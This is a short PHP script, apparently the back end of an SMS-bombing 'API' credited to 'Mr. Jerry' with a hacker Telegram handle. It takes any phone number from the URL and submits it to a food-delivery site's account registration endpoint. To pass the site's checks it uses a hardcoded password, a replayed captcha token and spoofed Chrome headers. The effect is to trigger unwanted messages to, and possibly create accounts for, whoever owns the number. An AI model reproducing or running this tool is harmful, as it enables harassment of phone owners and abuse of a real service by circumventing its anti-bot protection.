<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Get the phone parameter from the URL
$phone = isset($_GET['phone']) ? $_GET['phone'] : '';

// Format the phone number to an 11-digit string
$phone = preg_replace('/\D/', '', $phone);

// Validate that the phone number is 11 digits and starts with 0
if (strlen($phone) !== 11 || $phone[0] !== '0') {
    die('Invalid phone number. It must be an 11-digit number starting with 0.');
}

// API endpoint
$url = 'https://api.foodibd.com/users/api/Authentication/Customer/Register';

// Prepare the request payload
$data = [
    'email' => null,
    'mobileNumber' => $phone, // Use the formatted phone number
    'password' => 'Shahin#@321',
    'isEmail' => false,
    'captcha' => '03AFcWeA6K_tsOxoE_PUK5vjHgNdVcFEoVTArBfJ4ixhW-10x5yMEUGs-1XRRBOvLtdduLbbzFXn51jJhQXsg_J4eP4S7BysYEuzgNPiGJ5PGY2LrCTU1gzdlH5MrxHI0PBFeYUQpyeLMap69XAdyIQxiP9JZEu99mnHesqgVJTS1OTq6O1BVt_bf6RbeBfRTxFEeaSrTyPeqm7zejjh0y7SwY5fON4owfMCqhNh5bH25yL4fio8PPoerI_LVzk7Ii0II_mtVrKbaWpuTC4CJ6lB2YbWLStOE3ugKueyQ_m74Mtz0NWr-VQQ8arQlAOf2DNRP9tRGSYThWubyY5p9U3FHlE3n9z20yYxEQJpg3qPdkJ0RGYHL9-5_Pn6RfRTE7DhmSBnhqK5JYOFJEKyux_k9iYBWWRIS8reNU0UftP62hMClBnKrYvjMO69T89RLFnpainULimZFvabahLwt1CHmf64gzwRbeQ2fHfvkIFbm000NJXf0H412RSklChnw76XrjTt8bkudeSwXleUS4zFKqTddEo9OEuVh8nFe9E1V-1CVRi_-dRV7l4YDYsuskFg2XTYCdJ-msmdogvzML5--rOfhqQ8jl5a1hAwsTzdmpY9yO6Jv-SyWNxyV3YZP_HfnBvGtm2CgHz_4_gC6CC3DfKnEpgbwHAcembTo3iZuNU-k4PpjkRFtMMqWBa9Qr14PaJXOe24lYXRmFRH3CCV_VOIKfE6evEAB3ntwGDn6E0SpN-HtYO3EDCbLdjLYwNUtI_u4S0MrqRu8y280lDLxUZqszgU6eCNpJkUpSPKU5mCyb6x8AE0xiRKtML2VNOhK48DP93fau'
];

// Initialize cURL session
$ch = curl_init($url);

// Set cURL options
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json, text/plain, */*',
    'accept-language: en-US,en;q=0.9,bn;q=0.8',
    'content-type: application/json',
    'origin: https://foodibd.com',
    'referer: https://foodibd.com/',
    'sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));

// Execute the request
$response = curl_exec($ch);

// Check for errors and print the custom success message
if ($response === false) {
    echo 'Curl error: ' . curl_error($ch);
} else {
    // Output success response
    echo "Api Owner : Mɾ. Jҽɾɾყ 😈<br>";
    echo "Telegram : t.me/Mr_Jerry_Hacker";
}

// Close the cURL session
curl_close($ch);
?>
